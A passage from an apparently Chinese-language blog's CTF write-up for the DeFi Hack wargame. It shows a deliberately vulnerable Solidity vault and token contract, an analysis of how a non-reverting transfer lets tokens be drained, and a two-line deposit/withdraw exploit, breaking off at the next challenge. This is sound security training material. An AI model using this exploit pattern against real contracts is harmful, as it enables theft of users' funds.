{"title":"Defi Hack","uid":"68b9de7ae4d5b3763a05a9fb9f649b30","slug":"Defi Hack","date":"2022-08-02T02:46:57.436Z","updated":"2022-12-16T07:15:48.805Z","comments":true,"path":"api/articles/Defi Hack.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-w/images1/img/202208011807588.png","content":"<p>题库地址：<a href=\"https://www.defihack.xyz/\">https://www.defihack.xyz/</a></p>\n<h1 id=\"Defi-Hack\"><a href=\"#Defi-Hack\" class=\"headerlink\" title=\"Defi Hack\"></a>Defi Hack</h1><h2 id=\"1-May-The-Force-Be-With-You\"><a href=\"#1-May-The-Force-Be-With-You\" class=\"headerlink\" title=\"1.May The Force Be With You\"></a>1.May The Force Be With You</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><h3 id=\"Request\"><a href=\"#Request\" class=\"headerlink\" title=\"Request\"></a>Request</h3><p>A long time ago in a galaxy far, far away… a new DAO was created. Can you steal all the YODA tokens belonging to <code>MayTheForceBeWithYou</code> contract?</p></blockquote>\n<h3 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h3><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/math/SafeMath.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/access/Ownable.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">MayTheForceBeWithYou</span> <span class=\"token keyword\">is</span> ERC20<span class=\"token punctuation\">,</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n    MiniMeToken <span class=\"token keyword\">public</span> yoda<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> beneficiary<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> beneficiary<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Define the Yoda token contract</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _underlying<span class=\"token punctuation\">)</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xYODA\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"xYODA\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        yoda <span class=\"token operator\">=</span> <span class=\"token function\">MiniMeToken</span><span class=\"token punctuation\">(</span>_underlying<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Gets the amount of YODA locked in the contract</span>\n        <span class=\"token builtin\">uint256</span> totalYoda <span class=\"token operator\">=</span> yoda<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Gets the amount of xYODA in existence</span>\n        <span class=\"token builtin\">uint256</span> totalShares <span class=\"token operator\">=</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// If no xYODA exists, mint it 1:1 to the amount put in</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>totalShares <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> totalYoda <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\">// Calculate and mint the amount of xYODA the YODA is worth. The ratio will change overtime, as xYODA is burned/minted and YODA deposited + gained from fees / withdrawn.</span>\n        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">uint256</span> what <span class=\"token operator\">=</span> amount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>totalShares<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span>totalYoda<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> what<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\">// Lock the YODA in the contract</span>\n        yoda<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> numberOfShares<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Gets the amount of xYODA in existence</span>\n        <span class=\"token builtin\">uint256</span> totalShares <span class=\"token operator\">=</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Calculates the amount of YODA the xYODA is worth</span>\n        <span class=\"token builtin\">uint256</span> what <span class=\"token operator\">=</span>\n            numberOfShares<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>yoda<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span>totalShares<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_burn</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> numberOfShares<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        yoda<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> what<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> what<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">MiniMeToken</span> <span class=\"token keyword\">is</span> Ownable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint8</span> <span class=\"token keyword\">public</span> decimals<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> symbol<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> balances<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> allowed<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> totalSupply<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _tokenName<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> _decimalUnits<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _tokenSymbol\n    <span class=\"token punctuation\">)</span>  <span class=\"token keyword\">public</span>\n    <span class=\"token punctuation\">&#123;</span>\n        name <span class=\"token operator\">=</span> _tokenName<span class=\"token punctuation\">;</span>                                 <span class=\"token comment\">// Set the name</span>\n        decimals <span class=\"token operator\">=</span> _decimalUnits<span class=\"token punctuation\">;</span>                          <span class=\"token comment\">// Set the decimals</span>\n        symbol <span class=\"token operator\">=</span> _tokenSymbol<span class=\"token punctuation\">;</span>                             <span class=\"token comment\">// Set the symbol</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">doTransfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> _to<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _from<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>allowed<span class=\"token punctuation\">[</span>_from<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> _amount<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        allowed<span class=\"token punctuation\">[</span>_from<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _amount<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">doTransfer</span><span class=\"token punctuation\">(</span>_from<span class=\"token punctuation\">,</span> _to<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">doTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _from<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_amount <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\">// Do not allow transfer to 0x0 or the token contract itself</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_to <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>_to <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// If the amount being transfered is more than the balance of the</span>\n        <span class=\"token comment\">//  account the transfer returns false</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>_from<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token comment\">// First update the balance array with the new value for the address</span>\n        <span class=\"token comment\">//  sending the tokens</span>\n        balances<span class=\"token punctuation\">[</span>_from<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>_from<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> _amount<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Then update the balance array with the new value for the address</span>\n        <span class=\"token comment\">//  receiving the tokens</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> _amount <span class=\"token operator\">>=</span> balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Check for overflow</span>\n        balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> _amount<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// An event to make the transfer easy to find on the blockchain</span>\n        <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span>_from<span class=\"token punctuation\">,</span> _to<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_amount <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>allowed<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>_spender<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        allowed<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>_spender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _amount<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> _spender<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _spender<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> remaining<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> allowed<span class=\"token punctuation\">[</span>_owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>_spender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> balance<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">return</span> balances<span class=\"token punctuation\">[</span>_owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n      balances<span class=\"token punctuation\">[</span>_owner<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _amount<span class=\"token punctuation\">;</span>\n      totalSupply <span class=\"token operator\">+=</span> _amount<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> _from<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> _owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> _spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> _amount\n      <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Analyze\"><a href=\"#Analyze\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h3><p>分析deposit函数，初始状态下totalsupply为0，所以存在一个任意铸币漏洞，我们可以额任意进行铸币，使得totalsupply不为0，即可进行withdraw函数，再分析withdraw函数时发现，对于输入的numberOfShares并没有限制，并且what的值是由合约的余额计算的，输入的数值若是和totalsupply相等即可相互抵消，但是问题来了，我们并没有足够的余额，转账不会报错吗？往下继续分析，调用了yoda合约的transfer函数，transfer函数又调用了doTransfer函数，在此处进行了余额判断，但是问题也发生在此，仅仅是return一个false，而没有进行require，所以交易不会回滚，即没有余额也可以直接转账。所以思路出来了，先deposit，再以相同的参数调用withdraw函数集合通关</p>\n<h3 id=\"Attack\"><a href=\"#Attack\" class=\"headerlink\" title=\"Attack\"></a>Attack</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token string\">'100'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281239296.png\"></p>\n<h2 id=\"2-DiscoLP\"><a href=\"#2-DiscoLP\" class=\"headerlink\" title=\"2.DiscoLP\"></a>2.DiscoLP</h2><h3 id=\"Request-1\"><a href=\"#Request-1\" class=\"headerlink\" title=\"Request\"></a>Request</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 